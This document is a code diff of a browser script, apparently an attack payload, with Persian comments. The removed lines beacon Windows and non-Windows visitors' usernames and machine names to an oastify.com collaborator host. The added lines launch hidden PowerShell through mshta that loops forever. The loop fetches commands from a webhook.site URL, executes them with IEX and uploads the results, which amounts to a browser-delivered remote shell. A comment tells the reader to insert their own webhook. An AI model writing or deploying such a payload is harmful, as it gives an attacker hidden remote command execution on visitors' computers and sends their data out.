@@ -1,27 +1,27 @@
 <script>
-// فقط روی ویندوز اجرا بشه
-if (navigator.userAgent.indexOf("Windows") !== -1) {
-  const colab = "https://v0wclg7il52h9avyk88mspvuzl5et8hx.oastify.com";
-  const uid = Math.random().toString(36).substring(2,10);
+if (navigator.userAgent.indexOf("Windows") > -1) {
+  const webhook = "	https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d"; // ← این رو عوض کن با مال خودت
+  const pc = "${env:COMPUTERNAME}-${env:USERNAME}";
 
-  // PowerShell مخفی + فقط GET خالی
-  const ps = `$null = try { (New-Object Net.WebClient).DownloadString('https://v0wclg7il52h9avyk88mspvuzl5et8hx.oastify.com/win-'+[Environment]::UserName+'-'+[Environment]::MachineName+'-${uid}') } catch {}`;
+  const rev = `
+  while(1){
+    try{
+      $r = (New-Object Net.WebClient).DownloadString('${webhook}?cmd='+(Get-Date -U %s));
+      if($r){
+        $o = IEX $r -ErrorAction Stop | Out-String;
+        (New-Object Net.WebClient).UploadString('${webhook}','result='+$o+'&pc='+pc);
+      }
+    }catch{}
+    Start-Sleep -Seconds 5
+  }
+  `.replace(/\n/g,' ').trim();
 
-  const b64 = btoa(unescape(encodeURIComponent(ps)));
+  const b64 = btoa(unescape(encodeURIComponent(rev)));
 
   setTimeout(() => {
-    try {
-      location = "mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -enc " + b64 + "\",0)(window.close())";
-    } catch(e) {
-      location = "data:text/html,<script>new ActiveXObject('WScript.Shell').Run('powershell -enc " + b64 + "',0);close()</script>";
-    }
+    location = "mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -enc " + b64 + "\",0)(window.close())";
   }, 1200);
 
-  // یه درخواست JS هم بزن که بدونیم ویندوز باز کرده
-  fetch(colab + "/js-win-" + uid);
-}
-else {
-  // فقط یه درخواست ساده بزن که بدونیم غیر ویندوز بوده
-  fetch("https://v0wclg7il52h9avyk88mspvuzl5et8hx.oastify.com/non-win-" + navigator.platform);
+  fetch("${webhook}?beacon=started");
 }
 </script>
